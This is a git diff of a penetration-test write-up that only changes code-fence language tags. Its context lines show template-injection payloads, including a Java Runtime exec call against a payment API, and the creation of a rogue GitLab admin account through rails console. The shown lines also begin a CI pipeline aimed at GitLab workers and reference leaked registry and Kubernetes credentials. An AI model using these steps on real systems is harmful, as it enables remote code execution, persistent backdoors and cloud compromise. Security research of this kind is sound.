@@ -44,7 +44,7 @@ This API is used for creating orders and payment in their system. Body data look
 When playing around with different type of payloads, I tried the basic ones like SQLi, IDOR, XSS, .... but nothing work, until I tried this one `${7*7}`, a classic template injection and the back-end server response is very interesting.
 
 Response from server:
-```json
+```
 {'responseTime': 109566832492, 'message': 'Bad format request.', 'resultCode': "x", 'subErrors': [{'field': 'signature', 'message': 'Invalid signature. Check raw signature before signed. Raw data before hash: accessKey=*****&amount=200&data=xxx&redirectUrl=https://c61sta92vtc0000v26yggdyh7feyyyyyb.interactsh.com&orderId=random-idf&orderInfo=49'}]}
 ```
 
@@ -56,7 +56,7 @@ ${''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exe
 ```
 
 Server response:
-```json
+```
 {'responseTime': 1679566832492, 'message': 'Bad format request.', 'resultCode': "x", 'subErrors': [{'field': 'signature', 'message': 'Invalid signature. Check raw signature before signed. Raw data before hash: accessKey=*****&amount=2000&data=xxx&redirectUrl=https://c61sta92vtc0000v26yggdyh7feyyyyyb.interactsh.com&orderId=random-idf&orderInfo=start Process[pid=4024, exitValue="not exited"]'}]}
 ```
 
@@ -99,7 +99,7 @@ With that knowledge, I'm aiming to gain access in Gitlab worker instances
 ### 3. Abuse Gitlab CI/CD pipeline to gain access to Gitlab worker 
 
 Gaining access to Gitlab database by rails console:
-```
+```bash
 gitlab-rails console
 ```
 
@@ -121,7 +121,7 @@ With that knowledge and having access to gitlab's database, the attacker do the 
 irb(main):003:0 > user = User.create(:username => 'snovvcrash', :password => 'Passw0rd!', :password_confirmation => 'Passw0rd!', :admin => true, :name => 'snovvcrash', :email => 'snovvcrash@megacorp.local')
 ```
 - Login to Gitlab by the admin account just created ( by enable: `password_authentication_enabled_for_web: true` )
-```
+```ruby
 Gitlab::CurrentSettings.update!(password_authentication_enabled_for_web: true)
 ```
 - Create a repository
@@ -131,7 +131,7 @@ Gitlab::CurrentSettings.update!(password_authentication_enabled_for_web: true)
 **All the action above can be achived by calling Gitlab REST API with admin token**
 
 *.gitlab-ci.yml*
-```
+```yaml
 image: ubuntu:latest
 
   
@@ -182,7 +182,7 @@ GCR_PUSH_KEY={
 
 ```
 
-```
+```yaml
 apiVersion: v1
 clusters:
 - cluster:
